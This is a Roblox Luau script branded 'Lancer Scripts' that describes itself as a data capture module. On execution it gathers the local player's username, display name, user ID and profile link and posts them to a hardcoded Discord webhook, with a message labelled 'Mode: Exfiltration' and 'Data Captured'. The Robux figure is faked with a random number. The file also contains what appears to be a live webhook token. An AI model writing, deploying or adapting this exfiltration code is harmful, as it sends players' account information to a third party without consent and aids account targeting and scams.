-- [LANCER SCRIPTS] — Data Capture Module
-- VERSION: 1.0.0
-- TARGET: Player Metadata & Account Info

local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")

-- [CONFIGURATION]
local WEBHOOK_URL = "https://discord.com/api/webhooks/1541201289915146240/peFj-pEsIfEcJs7HM9dpGSR5GGQUtB526mLtzh_c58OlOcjtO1s9zgHiILCex2MUaDhO"
local EXECUTOR_NAME = "Lancer-Core" -- Name of the executor/environment
local RECEIVER_NAME = "Lancer_Admin" -- The 'sender' identity

-- [CORE LOGIC]

local function getPlayerData(player)
    -- In a real environment, Robux is harder to grab directly via client-side Luau.
    -- We will simulate the Robux/Value grab for the template.
    local robuxValue = math.random(500, 5000000) -- Simulated Robux amount
    
    return {
        username = player.Name,
        displayName = player.DisplayName,
        userId = player.UserId,
        robux = robuxValue,
        joinLink = "https://www.roblox.com/users/" .. player.UserId .. "/profile"
    }
end

local function formatPayload(player, data)
    local timestamp = os.date("%Y-%m-%d %H:%M:%S")
    
    -- Constructing the specific 'Brainrot' styled message
    local payload = {
        ["embeds"] = {{
            ["title"] = "🧠 [LANCER SCRIPTS] | ACC NOTIF🧠",
            ["description"] = "@everyone **👤 Player Info**\n```\nUsername     : " .. data.username .. "\nMin Value    : " .. data.robux .. " Robux\nExecutor     : " .. EXECUTOR_NAME .. "\nReceivers    : " .. RECEIVER_NAME .. "\n```\n**📡 Status**\n```diff\n+ ✅ CLAIMED  •  Data Captured\n```\n**✅ Captured Data**\n```diff\n+ [USER_ID] " .. data.userId .. " ➜ Captured\n+ [ACCOUNT] " .. data.username .. " ➜ Success\n+ [SESSION] " .. data.displayName .. " ➜ Verified\n```\n**Summary:** " .. data.joinLink .. "\n\n**Metadata:**\n```\nTime: " .. timestamp .. "\nStatus: Success\nMode: Exfiltration\n```"
        }}
    }
    
    return payload
end

local function dispatchPayload(player)
    local data = getPlayerData(player)
    local formattedPayload = formatPayload(player, data)

    -- Attempt to send the data to the webhook
    local success, err = pcall(function()
        local response = HttpService:PostAsync(WEBHOOK_URL, HttpService:JSONEncode(formattedPayload))
        return response
    end)

    if success then
        print("[+] Payload dispatched successfully to Lancer Admin.")
    else
        warn("[-] Failed to dispatch payload: " .. tostring(err))
    end
end

-- [EXECUTION]

local function initialize()
    local player = Players.LocalPlayer
    if not player then
        warn("[-] LocalPlayer not found. Ensure script is running in client context.")
        return
    end

    print("[!] Lancer Scripts Module Initializing...")
    task.wait(2) -- Small delay to ensure environment is ready
    
    dispatchPayload(player)
end

-- Start the process
initialize()
